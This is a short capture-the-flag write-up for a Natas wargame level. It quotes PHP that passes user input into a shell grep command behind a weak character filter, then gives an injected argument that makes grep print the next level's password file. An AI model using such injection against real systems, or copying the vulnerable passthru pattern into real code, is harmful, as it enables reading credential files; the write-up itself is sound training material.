## Level Goal
Excluding the URL and username, the Level Goal section is blank for the Natas ctf.


## Solution
Logging into the site we're not able to perform a word search and have the ability to view the page source.  

Let's look at the source:
```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

Now the site has implemented some basic filters to prevent the previous trick from working. However, the filters do not take all cases into account.

Enter the following:
```
. /etc/natas_webpass/natas11
```


## Explanation
Grep stands for Global Regular Expression Parser. The dot in regex stands for any single character. The result is grep matches and then outputs every character in natas11 and the dictionary.
